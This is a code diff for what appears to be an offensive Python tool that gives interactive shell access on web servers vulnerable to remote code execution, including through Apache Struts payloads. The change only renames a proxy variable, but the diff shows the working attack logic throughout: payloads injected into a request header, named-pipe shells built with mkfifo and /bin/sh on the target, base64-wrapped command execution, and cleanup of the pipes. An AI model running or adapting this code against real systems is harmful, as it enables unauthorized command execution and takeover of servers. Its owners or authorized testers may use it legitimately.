@@ -44,9 +44,9 @@ OUTPUT = 'fwdshout'
 
 
 class ForwardShell:
-	def __init__(self, url, proxy, payloadName, genPayload, pipesPath, interval=1.3):
+	def __init__(self, url, proxies, payloadName, genPayload, pipesPath, interval=1.3):
 		self._url = url
-		self._proxy = proxy
+		self._proxies = proxies
 		self._payloadName = payloadName
 		self._genPayload = genPayload
 		self._interval = interval
@@ -59,7 +59,7 @@ class ForwardShell:
 
 		cprint('[*] Setting up forward shell on target', 'green')
 		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh >& {self._stdout}'
-		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxy, self._payloadName, self._genPayload, timeout=0.5, firstConnect=True)
+		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxies, self._payloadName, self._genPayload, timeout=0.5, firstConnect=True)
 
 		cprint('[*] Setting up read thread', 'green')
 		self._lock = threading.Lock()
@@ -73,7 +73,7 @@ class ForwardShell:
 		getOutput = f'/bin/cat {self._stdout}'
 
 		while True:
-			result = ForwardShell.runRawCmd(getOutput, self._url, self._proxy, self._payloadName, self._genPayload)
+			result = ForwardShell.runRawCmd(getOutput, self._url, self._proxies, self._payloadName, self._genPayload)
 
 			if result:
 				try:
@@ -87,12 +87,12 @@ class ForwardShell:
 					print(result)
 
 				clearOutput = f'echo -n "" > {self._stdout}'
-				ForwardShell.runRawCmd(clearOutput, self._url, self._proxy, self._payloadName, self._genPayload)
+				ForwardShell.runRawCmd(clearOutput, self._url, self._proxies, self._payloadName, self._genPayload)
 
 			sleep(self._interval)
 
 	@staticmethod
-	def runRawCmd(cmd, url, proxy, payloadName, genPayload, timeout=50, firstConnect=False):
+	def runRawCmd(cmd, url, proxies, payloadName, genPayload, timeout=50, firstConnect=False):
 		if payloadName == 'ApacheStruts':
 			payload = genPayload(cmd)
 			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
@@ -117,7 +117,7 @@ class ForwardShell:
 					url,
 					headers=headers,
 					cookies=cookies,
-					proxies=proxy,
+					proxies=proxies,
 					timeout=timeout,
 					verify=False,
 					allow_redirects=False,
@@ -157,7 +157,7 @@ class ForwardShell:
 			b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
 			unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh >& /dev/null'
 
-		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxy, self._payloadName, self._genPayload)
+		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxies, self._payloadName, self._genPayload)
 		sleep(self._interval * 1.2)
 
 	def upgradeToPty(self):
@@ -178,12 +178,12 @@ def main():
 			url = url.rstrip()
 			break
 
-	proxy = input(colored('[>] Please enter proxy URL (optional):  ', 'magenta'))
-	if proxy:
-		proxy = proxy.rstrip()
-		proxy = {proxy.split('://')[0]: proxy}
+	proxies = input(colored('[>] Please enter proxies URL (optional):  ', 'magenta'))
+	if proxies:
+		proxies = proxies.rstrip()
+		proxies = {proxies.split('://')[0]: proxies}
 	else:
-		proxy = {}
+		proxies = {}
 
 	print('\n[?] Which payload you would like to use?\n')
 
@@ -212,7 +212,7 @@ def main():
 		if choice == '1':
 			cprint('\n############################### SINGLE CMD MODE ###############################\n', 'red')
 			cmd = input(colored('[>] Please enter the command you would like to execute:  ', 'magenta')).rstrip()
-			out = ForwardShell.runRawCmd(cmd, url, proxy, payloadName, payloadModule.genPayload)
+			out = ForwardShell.runRawCmd(cmd, url, proxies, payloadName, payloadModule.genPayload)
 			if out is not None:
 				print('\n' + out)
 			else:
@@ -222,7 +222,7 @@ def main():
 		elif choice == '2':
 			cprint('\n############################## FORWARD SHELL MODE #############################\n', 'red')
 			prompt = colored('FwdSh3ll> ', 'magenta')
-			sh = ForwardShell(url, proxy, payloadName, payloadModule.genPayload, args.pipes_path)
+			sh = ForwardShell(url, proxies, payloadName, payloadModule.genPayload, args.pipes_path)
 			print()
 
 			try:
@@ -242,7 +242,7 @@ def main():
 				cmd = f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'
 				b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
 				unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh >& /dev/null'
-				ForwardShell.runRawCmd(unwrapAndExec, url, proxy, payloadName, payloadModule.genPayload)
+				ForwardShell.runRawCmd(unwrapAndExec, url, proxies, payloadName, payloadModule.genPayload)
 				break
 
 
